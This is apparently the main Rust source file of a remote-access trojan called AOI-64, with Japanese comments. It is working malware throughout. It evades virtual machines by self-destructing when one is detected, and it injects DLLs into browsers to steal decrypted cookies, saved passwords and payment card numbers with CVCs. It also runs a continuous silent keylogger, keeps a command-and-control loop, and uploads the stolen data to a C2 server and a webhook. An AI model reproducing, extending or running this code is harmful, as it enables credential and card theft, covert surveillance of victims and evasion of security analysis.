// AOI-64 - 常時キーロガー動作版
use aoi_64::{
    load_config_or_default,
    security::detect_vm_environment_critical,
    send_unified_webhook,
    utils::emergency_self_destruct,
    C2Client, IntegratedPayload,
};
// rmp_serde は crypto.rs に統一
use serde::{Deserialize, Serialize};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use tokio::time::{sleep, Duration};

#[cfg(windows)]
use aoi_64::services::{BrowserData, BrowserInjector};

// DLL IPCデータ構造
#[derive(Serialize, Deserialize)]
struct CookieOut {
    host: String,
    name: String,
    path: String,
    value: String,
    expires: i64,
    secure: bool,
    #[serde(rename = "httpOnly")]
    http_only: bool,
}

#[derive(Serialize, Deserialize)]
struct PasswordOut {
    origin: String,
    username: String,
    password: String,
}

#[derive(Serialize, Deserialize)]
struct PaymentOut {
    name_on_card: String,
    expiration_month: i64,
    expiration_year: i64,
    card_number: String,
    cvc: String,
}

#[derive(Serialize, Deserialize)]
struct ChromeDecryptData {
    browser_name: String,
    profile_name: String,
    cookies: Vec<CookieOut>,
    passwords: Vec<PasswordOut>,
    payments: Vec<PaymentOut>,
}

#[derive(Serialize, Deserialize)]
struct ChromeDecryptResult {
    browser_type: String,
    profiles: Vec<ChromeDecryptData>,
    total_cookies: usize,
    total_passwords: usize,
    total_payments: usize,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // ⚠️ 最優先: VM検知実行 - 他の処理より前に実行
    println!("🔒 AOI-64 起動 - セキュリティチェック実行中...");
    if detect_vm_environment_critical() {
        // VM検知時は即座に完全自己消去
        println!("💥 セキュリティ違反検知 - 緊急自己消去実行");
        emergency_self_destruct().await;
        std::process::exit(1);
    }
    println!("✅ セキュリティチェック完了 - 通常動作開始");

    let config = load_config_or_default();
    let mut c2_client = C2Client::new(config.clone());

    // 初回データ収集（インライン化）
    #[cfg(windows)]
    {
        let dll_fut = collect_browser_data_via_dll();
        let payload_fut = IntegratedPayload::create_with_config(&config);
        let (dll_res, payload_res) = tokio::join!(dll_fut, payload_fut);
        let mut payload = payload_res?;

        if let Some(dll_data) = dll_res.as_ref() {
            // DLL注入で収集したブラウザデータをメインペイロードに統合
            for password in &dll_data.passwords {
                payload.auth_data.passwords.push(format!(
                    "[DLL_DECRYPTED] {}|{}|{}",
                    password.origin, password.username, password.password
                ));
            }
            for cookie in &dll_data.cookies {
                payload.auth_data.passwords.push(format!(
                    "[DLL_COOKIE] {}|{}|{}",
                    cookie.host, cookie.name, cookie.value
                ));
            }
            for payment in &dll_data.payments {
                payload.auth_data.passwords.push(format!(
                    "[DLL_PAYMENT] {}|{}|{}|{}",
                    payment.card_number, payment.name_on_card,
                    payment.expiration_month, payment.expiration_year
                ));
            }
        }

        process_and_save_data(payload, &config, &mut c2_client).await?;
    }

    #[cfg(not(windows))]
    {
        let _dll_res = collect_browser_data_via_dll().await;
        let payload = IntegratedPayload::create_with_config(&config).await?;
        process_and_save_data(payload, &config, &mut c2_client).await?;
    }

    // メインループ開始
    run_main_loop(config, c2_client).await
}

/// シンプルで効率的なメインループ
async fn run_main_loop(
    config: aoi_64::Config,
    c2_client: C2Client,
) -> Result<(), Box<dyn std::error::Error>> {
    let shutdown = Arc::new(AtomicBool::new(false));

    // Ctrl+C ハンドラー
    let shutdown_signal = shutdown.clone();
    tokio::spawn(async move {
        let _ = tokio::signal::ctrl_c().await;
        shutdown_signal.store(true, Ordering::Relaxed);
    });

    // 並行タスクを起動（インライン化）
    let mut tasks: Vec<tokio::task::JoinHandle<()>> = Vec::new();

    // キーロガータスク
    #[cfg(windows)]
    {
        let keylogger_shutdown = shutdown.clone();
        tasks.push(tokio::spawn(async move {
            continuous_keylogger(keylogger_shutdown).await;
        }));
    }

    // C2クライアントタスク
    if config.command_server_enabled {
        let mut c2_client = c2_client;
        let c2_shutdown = shutdown.clone();
        tasks.push(tokio::spawn(async move {
            while !c2_shutdown.load(Ordering::Relaxed) {
                if c2_client.start_c2_loop().await.is_err() {
                    sleep(Duration::from_secs(10)).await;
                }
            }
        }));
    }

    // VM検知監視タスク（60秒間隔）
    let vm_shutdown = shutdown.clone();
    tasks.push(tokio::spawn(async move {
        use aoi_64::security::detect_vm_environment;
        use aoi_64::utils::emergency_self_destruct;

        while !vm_shutdown.load(Ordering::Relaxed) {
            sleep(Duration::from_secs(60)).await;
            if detect_vm_environment(true) {
                emergency_self_destruct().await;
                std::process::exit(0);
            }
        }
    }));

    // シンプルなメインループ - shutdownフラグを監視
    while !shutdown.load(Ordering::Relaxed) {
        sleep(Duration::from_secs(1)).await;
    }

    // タスク終了処理（インライン化）
    for task in tasks {
        task.abort();
        let _ = task.await;
    }

    // 最終保存
    #[cfg(windows)]
    {
        let _ = aoi_64::save_session_to_file();
    }

    Ok(())
}

// start/cleanup は run_main_loop 内にインライン化

/// 完全常時キーロガー実行（休憩なし）
#[cfg(windows)]
async fn continuous_keylogger(running: Arc<AtomicBool>) {
    use aoi_64::collectors::key_mouse_logger::{collect_input_events_for, InputEvent};
    use aoi_64::{get_statistics, save_session_to_file};
    use std::collections::VecDeque;
    use std::sync::{Arc, Mutex};

    // サイレント起動

    // リアルタイムイベントバッファ
    let event_buffer: Arc<Mutex<VecDeque<InputEvent>>> = Arc::new(Mutex::new(VecDeque::new()));
    let _buffer_clone = event_buffer.clone();
    let running_clone = running.clone();

    // バックグラウンドでの定期保存タスク
    let save_task = tokio::spawn(async move {
        let mut save_count = 0;
        while running_clone.load(Ordering::Relaxed) {
            sleep(Duration::from_secs(30)).await; // 30秒ごとに保存

            save_count += 1;
            if let Err(e) = save_session_to_file() {
                eprintln!("❌ Auto-save #{} error: {}", save_count, e);
            } else {
                println!("� Auto-save #{} completed", save_count);

                // 統計情報表示
                if let Some(stats) = get_statistics() {
                    println!(
                        "   📈 Total: {}keys, {}clicks",
                        stats.total_keystrokes, stats.total_mouse_clicks
                    );
                }
            }
        }
    });

    // メインキーロガーループ - 完全連続動作
    let mut _total_events = 0;
    while running.load(Ordering::Relaxed) {
        // 1秒間のキャプチャ（短時間で連続実行）
        let events_text = tokio::task::spawn_blocking(|| {
            collect_input_events_for(1000) // 1秒間
        })
        .await
        .unwrap_or_default();

        if !events_text.is_empty() {
            _total_events += events_text.len();
            // サイレント動作（イベントごとの出力なし）
        }

        // 休憩完全削除 - 即座に次のキャプチャ（高速連続動作）
    }

    // 保存タスクを停止
    save_task.abort();

    // 最終保存（サイレント）
    let _ = save_session_to_file();
}

#[cfg(not(windows))]
async fn continuous_keylogger(running: Arc<AtomicBool>) {
    // サイレント待機
    while running.load(Ordering::Relaxed) {
        sleep(Duration::from_secs(10)).await;
    }
}

// 初回データ収集は main にインライン化

/// ブラウザDLL注入でデータ収集（Windows専用）
#[cfg(windows)]
async fn collect_browser_data_via_dll() -> Option<BrowserData> {
    match BrowserInjector::new() {
        Ok(injector) => {
            let ipc_handle = tokio::spawn(async { receive_ipc_data().await });

            // 少し待ってからDLL注入を開始
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

            // DLL注入を実行
            match injector.inject_all_browsers().await {
                Ok(mut browser_data) => {
                    // IPCデータの受信を待機（タイムアウト付き）
                    match tokio::time::timeout(tokio::time::Duration::from_secs(10), ipc_handle)
                        .await
                    {
                        Ok(Ok(Some(ipc_result))) => {
                            use aoi_64::services::{DllCookieOut, DllPasswordOut, DllPaymentOut};
                            for profile in &ipc_result.profiles {
                                for password in &profile.passwords {
                                    browser_data.passwords.push(DllPasswordOut {
                                        origin: format!("[IPC_{}] {}", profile.browser_name, password.origin.clone()),
                                        username: password.username.clone(),
                                        password: password.password.clone(),
                                    });
                                }
                                for cookie in &profile.cookies {
                                    browser_data.cookies.push(DllCookieOut {
                                        host: format!("[IPC_{}] {}", profile.browser_name, cookie.host.clone()),
                                        name: cookie.name.clone(),
                                        path: cookie.path.clone(),
                                        value: cookie.value.clone(),
                                        expires: cookie.expires,
                                        secure: cookie.secure,
                                        http_only: cookie.http_only,
                                    });
                                }
                                for payment in &profile.payments {
                                    browser_data.payments.push(DllPaymentOut {
                                        name_on_card: format!("[IPC_{}] {}", profile.browser_name, payment.name_on_card.clone()),
                                        expiration_month: payment.expiration_month,
                                        expiration_year: payment.expiration_year,
                                        card_number: payment.card_number.clone(),
                                        cvc: payment.cvc.clone(),
                                    });
                                }
                            }
                        }
                        Ok(Ok(None)) => {}
                        Ok(Err(_)) => {}
                        Err(_) => {}
                    }

                    Some(browser_data)
                }
                Err(_) => None,
            }
        }
        Err(_) => {
            // サイレント エラー処理
            None
        }
    }
}

#[cfg(not(windows))]
async fn collect_browser_data_via_dll() -> Option<()> {
    None
}

/// Windows名前付きパイプサーバーでDLLからIPCデータを受信
#[cfg(windows)]
async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
    use std::ffi::c_void;
    use std::ptr;

    // Windows API定義
    #[link(name = "kernel32")]
    extern "system" {
        fn CreateNamedPipeW(
            lpName: *const u16,
            dwOpenMode: u32,
            dwPipeMode: u32,
            nMaxInstances: u32,
            nOutBufferSize: u32,
            nInBufferSize: u32,
            nDefaultTimeOut: u32,
            lpSecurityAttributes: *mut c_void,
        ) -> *mut c_void;
        fn ConnectNamedPipe(hNamedPipe: *mut c_void, lpOverlapped: *mut c_void) -> i32;
        fn ReadFile(
            hFile: *mut c_void,
            lpBuffer: *mut c_void,
            nNumberOfBytesToRead: u32,
            lpNumberOfBytesRead: *mut u32,
            lpOverlapped: *mut c_void,
        ) -> i32;
        fn CloseHandle(hObject: *mut c_void) -> i32;
        fn GetLastError() -> u32;
    }

    const PIPE_ACCESS_INBOUND: u32 = 0x00000001;
    const PIPE_TYPE_BYTE: u32 = 0x00000000;
    const PIPE_READMODE_BYTE: u32 = 0x00000000;
    const PIPE_WAIT: u32 = 0x00000000;
    const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;

    // パイプ名をワイド文字に変換
    let pipe_name = "\\\\.\\pipe\\rat64_chrome_data\0"
        .encode_utf16()
        .collect::<Vec<u16>>();

    unsafe {
        let pipe_handle = CreateNamedPipeW(
            pipe_name.as_ptr(),
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1,
            0,
            10485760, // 10MB受信バッファ（64KB→10MBに拡張）
            0,
            ptr::null_mut(),
        );

        if pipe_handle == INVALID_HANDLE_VALUE {
            return None;
        }

        // DLLからの接続を待機（タイムアウト設定）
        let result = ConnectNamedPipe(pipe_handle, ptr::null_mut());
        if result == 0 {
            let error = GetLastError();
            // ERROR_PIPE_CONNECTED (535) は既に接続済みを意味する
            if error != 535 {
                CloseHandle(pipe_handle);
                return None;
            }
        }

        // データ受信
        let mut buffer = vec![0u8; 1024 * 1024]; // 1MB受信バッファ
        let mut bytes_read = 0u32;

        if ReadFile(
            pipe_handle,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.len() as u32,
            &mut bytes_read,
            ptr::null_mut(),
        ) == 0
        {
            CloseHandle(pipe_handle);
            return None;
        }

        CloseHandle(pipe_handle);

        if bytes_read > 0 {
            buffer.truncate(bytes_read as usize);
            let json_data = String::from_utf8_lossy(&buffer);

            match serde_json::from_str::<ChromeDecryptResult>(&json_data) {
                Ok(result) => Some(result),
                Err(_) => None,
            }
        } else {
            None
        }
    }
}

// integrate_ipc_data / integrate_dll_browser_data はインライン化

/// データの暗号化・保存・送信処理
async fn process_and_save_data(
    payload: aoi_64::IntegratedPayload,
    config: &aoi_64::Config,
    c2_client: &mut C2Client,
) -> Result<(), Box<dyn std::error::Error>> {
    use aoi_64::utils::crypto::{process_and_encrypt_data, upload_encrypted_to_c2_with_filename};

    // 暗号化処理を統合関数で実行（セキュリティ強化: 生キー・ナンスは保持しない）
    let (encrypted, wrapped, data_filename, _key_filename) = process_and_encrypt_data(&payload, config).await?;

    // C2アップロードとWebhook送信を可能なら並列化
    let upload_enabled = config.command_server_enabled;
    let webhook_enabled = config.webhook_enabled && !config.webhook_url.trim().is_empty();

    match (upload_enabled, webhook_enabled) {
        (true, true) => {
            let upload_result = upload_encrypted_to_c2_with_filename(c2_client, &encrypted, &wrapped, "integrated_payload", Some(&data_filename)).await;
            let webhook_result = send_unified_webhook(&payload, config).await;
            
            match upload_result {
                Ok(()) => println!("✅ Encrypted data uploaded to C2 server successfully"),
                Err(e) => println!("❌ C2 encrypted upload failed: {}", e),
            }
            
            match webhook_result {
                Ok(()) => println!("✅ Webhook sent successfully"),
                Err(e) => println!("❌ Webhook failed: {}", e),
            }
        }
        (true, false) => {
            match upload_encrypted_to_c2_with_filename(c2_client, &encrypted, &wrapped, "integrated_payload", Some(&data_filename)).await {
                Ok(()) => println!("✅ Encrypted data uploaded to C2 server successfully"),
                Err(e) => println!("❌ C2 encrypted upload failed: {}", e),
            }
        }
        (false, true) => {
            match send_unified_webhook(&payload, config).await {
                Ok(()) => println!("✅ Webhook sent successfully"),
                Err(e) => println!("❌ Webhook failed: {}", e),
            }
        }
        (false, false) => {
            println!("📦 Data encrypted and saved locally only (no upload configured)");
        }
    }

    Ok(())
}
